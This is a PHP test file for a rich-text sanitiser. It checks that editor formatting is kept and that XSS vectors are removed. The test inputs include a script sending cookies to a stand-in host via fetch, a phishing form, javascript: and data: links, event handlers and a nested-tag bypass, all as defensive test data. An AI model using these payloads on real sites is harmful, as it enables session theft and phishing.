<?php

use App\Actions\SanitiseRichText;

beforeEach(function () {
    $this->action = new SanitiseRichText;
});

/**
 * Markup the TipTap toolbar can actually create. These matter as much as
 * the attack cases: a tightened allowlist silently strips formatting an
 * admin already saved, and nothing would tell them it happened.
 *
 * @return array<string, list<string>>
 */
dataset('editorMarkupProvider', function () {
    return [
        'paragraph' => ['<p>Meet at the north entrance.</p>', 'Meet at the north entrance.'],
        'bold' => ['<p><strong>Bring the key</strong></p>', '<strong>'],
        'italic' => ['<p><em>usually</em></p>', '<em>'],
        'strikethrough' => ['<p><s>Old spot</s></p>', '<s>'],
        'bullet list' => ['<ul><li>Keys</li></ul>', '<ul>'],
        'ordered list' => ['<ol><li>Collect</li></ol>', '<ol>'],
        'heading' => ['<h3>Parking</h3>', '<h3>'],
        'line break' => ['<p>Level 1<br>Rear door</p>', '<br'],
        'blockquote' => ['<blockquote><p>Note</p></blockquote>', '<blockquote>'],
        'horizontal rule' => ['<hr>', '<hr'],
        'code' => ['<p><code>Gate 4</code></p>', '<code>'],
    ];
});

test('it keeps markup the editor produces', function (string $html, string $expected) {
    $this->assertStringContainsString($expected, $this->action->execute($html));
})->with('editorMarkupProvider');

test('it keeps the alignment the editor writes as an inline style', function () {
    $result = $this->action->execute('<p style="text-align: center">Centre</p>');

    $this->assertStringContainsString('text-align', $result);
    $this->assertStringContainsString('Centre', $result);
});

/**
 * @return array<string, list<string>>
 */
dataset('allowedSchemeProvider', function () {
    return [
        'https' => ['https://example.org'],
        'http' => ['http://example.org'],
        'mailto' => ['mailto:coordinator@example.org'],
        'tel' => ['tel:+61312345678'],
        'sms' => ['sms:+61312345678'],
    ];
});

test('it keeps links using a scheme the editor offers', function (string $href) {
    $result = $this->action->execute(sprintf('<a href="%s">Contact</a>', $href));

    $this->assertStringContainsString('<a ', $result);
    $this->assertStringContainsString('href', $result);
    $this->assertStringContainsString('Contact', $result);
})->with('allowedSchemeProvider');

test('it forces rel on links so a new tab cannot reach the opener', function () {
    $result = $this->action->execute('<a href="https://example.org" target="_blank">Map</a>');

    $this->assertStringContainsString('noopener', $result);
});

test('it drops a script tag and its contents', function () {
    $result = $this->action->execute('<p>Hi</p><script>fetch("//evil.tld?c="+document.cookie)</script>');

    $this->assertStringContainsString('Hi', $result);
    $this->assertStringNotContainsString('script', $result);
    $this->assertStringNotContainsString('fetch', $result);
});

/**
 * @return array<string, list<string>>
 */
dataset('eventHandlerProvider', function () {
    return [
        'onclick' => ['onclick'],
        'onerror' => ['onerror'],
        'onload' => ['onload'],
        'onmouseover' => ['onmouseover'],
        'onfocus' => ['onfocus'],
    ];
});

test('it strips event handlers', function (string $attribute) {
    $result = $this->action->execute(sprintf('<p %s="alert(1)">Text</p>', $attribute));

    $this->assertStringNotContainsString($attribute, $result);
    $this->assertStringContainsString('Text', $result);
})->with('eventHandlerProvider');

/**
 * @return array<string, list<string>>
 */
dataset('dangerousSchemeProvider', function () {
    return [
        'javascript' => ['javascript:alert(1)', 'javascript:'],
        'data' => ['data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==', 'data:'],
        'vbscript' => ['vbscript:msgbox(1)', 'vbscript:'],
    ];
});

test('it drops links using a scheme the editor cannot produce', function (string $href, string $needle) {
    $result = $this->action->execute(sprintf('<a href="%s">Click</a>', $href));

    $this->assertStringNotContainsStringIgnoringCase($needle, $result);

    // The text stays: the link is defused, not the sentence around it.
    $this->assertStringContainsString('Click', $result);
})->with('dangerousSchemeProvider');

test('it drops an image carrying a handler', function () {
    $result = $this->action->execute('<img src=x onerror="alert(1)">');

    $this->assertStringNotContainsString('onerror', $result);
    $this->assertStringNotContainsString('<img', $result);
});

test('it drops an iframe', function () {
    $this->assertStringNotContainsString('iframe', $this->action->execute('<iframe src="//evil.tld"></iframe>'));
});

test('it drops a form that could phish inside the dashboard', function () {
    $result = $this->action->execute('<form action="//evil.tld"><input name="password"></form>');

    $this->assertStringNotContainsString('<form', $result);
    $this->assertStringNotContainsString('<input', $result);
});

test('it drops svg wrapped script', function () {
    $this->assertStringNotContainsString('alert', $this->action->execute('<svg><script>alert(1)</script></svg>'));
});

test('it drops a style element that could hide the page', function () {
    $this->assertStringNotContainsString('display:none', $this->action->execute('<style>body{display:none}</style>'));
});

test('it survives a payload that only becomes a tag once unwrapped', function () {
    // A naive single-pass stripper turns this into `<script>` by removing
    // the inner pair. The sanitiser parses rather than pattern-matches.
    $result = $this->action->execute('<scr<script>ipt>alert(1)</scr</script>ipt>');

    $this->assertStringNotContainsString('<script', $result);
});

/**
 * @return array<string, list<string|null>>
 */
dataset('emptyValueProvider', function () {
    return [
        'null' => [null],
        'empty string' => [''],
        'whitespace' => ['   '],
    ];
});

test('it returns an empty value untouched', function (?string $value) {
    expect($this->action->execute($value))->toBe($value);
})->with('emptyValueProvider');

test('it leaves plain text alone', function () {
    $this->assertStringContainsString('Just a note', $this->action->execute('Just a note'));
});
